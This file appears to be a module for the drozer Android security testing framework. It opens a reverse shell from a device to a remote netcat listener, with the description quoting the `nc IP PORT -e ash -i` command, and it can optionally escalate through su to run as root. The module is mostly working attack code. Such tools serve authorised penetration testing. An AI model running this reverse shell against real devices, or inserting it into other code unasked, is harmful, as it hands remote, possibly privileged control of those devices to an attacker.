from drozer.modules import common, Module

class Send(Module, common.Shell, common.SuperUser):

    name = "Send an ASH shell to a remote listener."
    description = """Send an ASH Shell to a remote listener.

This module executes `nc IP PORT -e ash -i`, using BusyBox. This will send an ASH shell to a netcat listener."""
    examples = ""
    author = "Tyrone (@mwrlabs)"
    date = "2013-07-25"
    license = "BSD (3 clause)"
    path = ["shell"]

    def add_arguments(self, parser):
        parser.add_argument("ip", help="ip address of the remote listener")
        parser.add_argument("port", help="port address of the remote listener")
        parser.add_argument("-p", "--privileged", action="store_true", default=False, help="request root to perform the task in a privileged context")

    def execute(self, arguments):
        command = "sh"

        privileged = arguments.privileged
        if privileged:
            if self.isAnySuInstalled():
                command = self.suPath() + " -c \"%s\"" % command
            else:
                self.stdout.write("su is not installed...reverting back to unprivileged mode\n")
                privileged = False

        self.reverseShell(command, arguments.ip, arguments.port)